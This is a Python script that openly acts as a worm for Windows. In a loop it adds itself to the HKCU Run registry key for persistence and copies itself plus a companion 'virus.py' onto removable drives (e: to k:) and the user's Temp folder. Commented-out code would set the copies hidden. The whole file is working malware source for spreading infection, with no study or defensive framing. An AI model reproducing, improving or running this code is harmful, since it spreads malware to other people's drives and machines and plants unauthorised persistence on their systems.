import shutil
import winreg as reg
import time
import os


user = os.getlogin()
flash = ['e:','f:','g:','h:','i:','j:','k:','C:\\Users\\%s\\AppData\\Local\\Temp'%user]
timer = 0
while True:
    time.sleep(3)
    pwd = os.getcwd()
    timer += 1
## those code it's for move mix.py to registry windows
    pth = os.path.dirname(os.path.realpath(__file__))  
    s_name="mix.py" 
    address=os.path.join(pth,s_name) 
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
    reg.CloseKey(open)
    print(pwd)
    if pwd == 'C:\\Windows\\system32':
        os.chdir('C:\\Users\\%s\\AppData\\Local\\Temp'%user)
        for x in flash :
            try:
                cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
                cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
                #ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
                #ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
                #print('hidden sucsessful')
                print('run 1  ')
            except:
                print('error 1')
                pass
        os.chdir('C:\\Windows\\system32')

    else:
        for x in flash :
            try:
                cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
                cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
                #ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
                #ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
                #print('hidden sucsessful')
                print('run 2  ')
            except:
                print('error 2')
                pass
   
    

